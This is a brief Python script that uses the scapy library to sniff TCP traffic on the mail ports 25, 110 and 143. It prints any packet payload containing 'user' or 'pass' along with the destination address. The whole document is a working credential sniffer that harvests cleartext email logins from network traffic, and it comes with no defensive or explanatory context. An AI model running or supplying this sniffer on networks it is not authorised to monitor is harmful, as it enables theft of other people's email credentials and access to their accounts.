from scapy.all import *

def showPacket(packet):
	data = '%s' %(packet[TCP].payload)
	if 'user' in data.lower() or 'pass' in data.lower():
		print('+++[%s]: %s' %(packet[IP].dst, data))

def main(filter):
	sniff(filter=filter, prn=showPacket, count=0, store=0)
	
if __name__ == '__main__':
	filter = 'tcp port 25 or tcp port 110 or tcp port 143'
	main(filter)